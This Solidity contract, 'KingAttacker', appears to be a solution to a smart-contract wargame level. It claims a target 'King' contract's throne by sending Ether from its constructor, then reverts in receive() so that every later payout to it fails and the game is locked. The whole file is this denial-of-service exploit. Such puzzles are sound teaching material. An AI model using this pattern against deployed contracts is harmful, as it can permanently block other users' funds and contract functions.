// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

contract KingAttacker {
  address payable kingContract;
  bool protected = false;

  constructor(address payable _address) payable {
    kingContract = _address;

    (bool success, ) = payable(address(kingContract)).call{value: msg.value}("");
    require(success, "external call failed");
  }

  receive() external payable {
     revert();
  }

}
